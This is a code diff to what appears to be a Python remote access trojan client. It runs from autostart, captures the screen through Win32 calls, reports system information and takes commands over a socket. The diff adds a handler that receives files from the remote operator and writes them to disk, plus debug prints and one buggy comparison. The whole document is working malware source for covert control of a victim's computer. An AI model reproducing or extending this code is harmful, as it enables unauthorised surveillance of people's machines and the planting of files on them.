@@ -96,7 +96,7 @@ def Send(sock, data, mode, splitter='%:::%', end="[ENDOFMESSAGE]"):
     sock.sendall(str(size) + '%:::%' + msg)
 
 
-def Receive(sock, splitter='%:::%', mode='info', end="[ENDOFMESSAGE]"):
+def Receive(sock, splitter='%:::%', end="[ENDOFMESSAGE]"):
     recievedData = ""
     l = sock.recv(1024)
     while l:
@@ -111,6 +111,22 @@ def Receive(sock, splitter='%:::%', mode='info', end="[ENDOFMESSAGE]"):
     else:
         return 'info', ''
 
+def upload():
+    pass
+
+def download(sock, filename, end="[ENDOFMESSAGE]"):
+    recievedData = ''
+    l = sock.recv(1024)
+    while l:
+        recievedData += l
+        if recievedData.endswith(end):
+            break
+        else:
+            l = sock.recv(1024)
+    with open(filename, 'wb') as _file:
+        _file.write(recievedData[:-len(end)])
+    return 'downloadDone'
+
 
 def ScreenBITS():
     hDesktopDC = User32.GetWindowDC(hDesktopWnd)
@@ -123,7 +139,7 @@ def ScreenBITS():
     DIB_RGB_COLORS = 0
     Gdi32.GetDIBits(hdc, hCaptureBitmap, 0, 0, None, ctypes.byref(bmp_info), DIB_RGB_COLORS)
     bmp_info.bmiHeader.biSizeimage = int(
-        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8);
+        bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
     pBuf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
     Gdi32.GetBitmapBits(hCaptureBitmap, bmp_info.bmiHeader.biSizeimage, pBuf)
     return zlib.compress(pBuf)
@@ -230,6 +246,16 @@ def fromAutostart():
         while 1:
             try:
                 mode, data = Receive(s)
+                print data
+                if data.startswith('upload '):
+                    print 'vtvirtav'
+                    try:
+                        filename = data.split(' ')[1]
+                        stdoutput = download(s, filename)
+                    except:
+                        stdoutput = 'uploadError'
+                    Send(s, stdoutput, mode)
+                    continue
                 if data == 'info':
                     Send(s, PCINFO(), mode)
                     continue
@@ -251,6 +277,13 @@ def fromAutostart():
                             stdoutput = PCINFO()
                         elif data == 'getScreen':
                             stdoutput = SCREENSHOT()
+                        elif data.startswith == 'upload ':
+                            print 'vtvirtav'
+                            try:
+                                filename = data.split(' ')[1]
+                                stdoutput = download(s, filename)
+                            except:
+                                stdoutput = 'uploadError'
                         elif data.startswith("cd"):
                             try:
                                 os.chdir(data[3:])
